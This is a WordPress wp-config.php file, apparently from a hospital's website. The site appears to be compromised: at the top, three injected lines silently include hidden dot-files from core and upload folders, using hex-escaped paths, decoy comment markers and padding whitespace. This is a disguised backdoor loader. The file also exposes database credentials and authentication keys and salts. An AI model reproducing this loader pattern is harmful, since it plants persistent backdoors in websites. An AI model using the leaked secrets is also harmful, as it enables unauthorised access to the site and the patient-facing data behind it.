<?php
/*5566c*/

@include /*t5274*/("/hom\x65/camr47_h0stpila/camryhospitals.in/wp\x2dinclud\x65s/blocks/post\x2dt\x65rms/.458c0c51.oti");

/*5566c*/

































/*ae1da*/

@include ("/\x68ome/camr7_\x680stpila/camry\x68ospitals.in/wp\x2dincludes/rest\x2dapi/fields/.1b6ce0ac.otc");

/*ae1da*/
/*fa4d0*/

@include ("/home/dh_abw3fb/camryhospitals.in/wp\x2dcontent/\x75ploads/wpforms/.61f7243a.otc");

/*fa4d0*/



/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, WordPress Language, and ABSPATH. You can find more information
 * by visiting {@link http://codex.wordpress.org/Editing_wp-config.php Editing
 * wp-config.php} Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'newcamry');

/** MySQL database username */
define('DB_USER', 'camry_hos');

/** MySQL database password */
define('DB_PASSWORD', 'C#amryH$osp@6');

/** MySQL hostname */
define('DB_HOST', 'mysql.camryhospitals.in');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         ';"#GXC1h)_B2%/(|nl@fuW8KPM~3a#/f3?6K~@m`Qve|6I1ydy?`hpn$%Qctjt5#');
define('SECURE_AUTH_KEY',  '/Cs(0v`Al$^1"v|a#9J:mxIW9Mo!%|5%64g7bdgbXg4Napnms$an4yG#P$N:e53*');
define('LOGGED_IN_KEY',    ':DE3O7Uav?EzhwFEk`C*1YcDWcC"|DIff$G5EuMSG"%C5Du4OBFU52fl3ilQ4%$W');
define('NONCE_KEY',        '8_)e?1EU;Al5OTS@6|xM6|nE6?(/)Nwr%DETs9W$xk+58Lh8ATGh/53a85cnM8CG');
define('AUTH_SALT',        'N3UbUES9Pci7:Jp90@&gf?7l87!16PrK?1M(%aLA`7Iq/rM7*6aH3)0lc?3m+Zz~');
define('SECURE_AUTH_SALT', 's4`TMf~a3@g_EtnD^#X5z1*931wutDIKG^+b*4;waO69zK;aPzU`&Q1GWUK*#hp1');
define('LOGGED_IN_SALT',   'qocN7)(5eV1`*u7eSr?XR%U3E*8FNB|I*F1#(z?)`E~m/OdkDanr@HG@AnO4"WgJ');
define('NONCE_SALT',       'qi*1Y|nLu;3IB/`_r0H@I`aaKrTT5KAE+pSKraOk/Nv&$sii|;RTqgbU"IFP%#+|');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each a unique
 * prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_z8afab_';

/**
 * Limits total Post Revisions saved per Post/Page.
 * Change or comment this line out if you would like to increase or remove the limit.
 */
define('WP_POST_REVISIONS',  10);

/**
 * WordPress Localized Language, defaults to English.
 *
 * Change this to localize WordPress. A corresponding MO file for the chosen
 * language must be installed to wp-content/languages. For example, install
 * de_DE.mo to wp-content/languages and set WPLANG to 'de_DE' to enable German
 * language support.
 */
define('WPLANG', '');

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 */
define('WP_DEBUG', false);

/**
 * Removing this could cause issues with your experience in the DreamHost panel
 */

if (preg_match("/^(.*)\.dream\.website$/", $_SERVER['HTTP_HOST'])) {
        $proto = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https" : "http";
        define('WP_SITEURL', $proto . '://' . $_SERVER['HTTP_HOST']);
        define('WP_HOME',    $proto . '://' . $_SERVER['HTTP_HOST']);
        define('JETPACK_STAGING_MODE', true);
}

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
